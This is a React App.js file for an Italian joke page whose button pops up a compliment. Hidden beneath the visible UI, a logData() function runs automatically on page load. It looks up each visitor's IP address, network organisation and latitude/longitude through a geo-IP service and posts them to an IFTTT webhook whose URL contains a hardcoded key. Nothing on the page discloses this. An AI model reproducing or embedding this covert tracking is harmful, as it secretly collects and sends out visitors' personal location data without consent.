import './App.css';

const axios = require('axios');

function App() {
  return (
    <div className="App">
      <header className="App-header">
        <p>
          Clicca il bottone è ti dirò quanto sei bello/a!
        </p>
        <button onClick={amazingAlert}>Clicca Qui!</button>
      </header>
    </div>
  );
}
function amazingAlert(){
  alert('ODDIO MA SEI BELLISSIMO/A');
}

function logData(){
  axios.get("https://json.geoiplookup.io/")
  .then(function(response){
      let ip = response.data.ip;
      let author = response.data.org;
      let lat = response.data.lat;
      let long = response.data.long;
      lat.toString();
      long.toString();
      triggerIFTTT(ip, author, lat, long)
  })
  .catch(function (e){
    console.error(e);
  })
}

function triggerIFTTT(ip, author, lat, long){
  let complete_position = "lat: " + lat + "long: "+ long;
  let url = "https://maker.ifttt.com/trigger/data_trigger/with/key/f-NHVw9KeITH9nLMbbUH6Yd2hifSrOwGcuCWWnyuMpH?value1=" + ip + "&value2=" + author + "&value3="+ complete_position;  
  axios.post(url)
}

logData()

export default App;
